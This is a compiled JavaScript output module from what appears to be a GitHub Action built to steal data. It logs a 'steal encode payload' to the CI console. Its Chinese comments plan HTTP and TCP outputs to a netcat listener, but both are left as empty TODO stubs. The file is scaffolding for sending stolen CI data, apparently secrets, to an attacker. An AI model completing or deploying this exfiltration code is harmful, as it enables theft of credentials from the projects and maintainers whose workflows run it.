"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.output = void 0;
const tslib_1 = require("tslib");
const core = tslib_1.__importStar(require("@actions/core"));
const config_1 = require("./config");
/**
 * 将结果输出到标准输出流中
 */
class ConsoleOutput {
    output(config, payload) {
        core.info(`steal encode payload: ${payload}`);
    }
}
/**
 * 将结果使用HTTP输出，目标端是个http服务，也可以是NC -l监听的端口
 */
class HttpOutput {
    output(config, payload) {
        // TODO
    }
}
/**
 * 将结果使用TCP输出，目标端应该是NC之类的
 */
class TcpOutput {
    output(config, payload) {
        // TODO
    }
}
function output(config, payload) {
    let output;
    switch (config.outputConfig.type) {
        case config_1.OutputType.CONSOLE:
            output = new ConsoleOutput();
            break;
        case config_1.OutputType.TCP:
            output = new TcpOutput();
            break;
        case config_1.OutputType.HTTP:
            output = new HttpOutput();
            break;
    }
    output.output(config, payload);
}
exports.output = output;
//# sourceMappingURL=output.js.map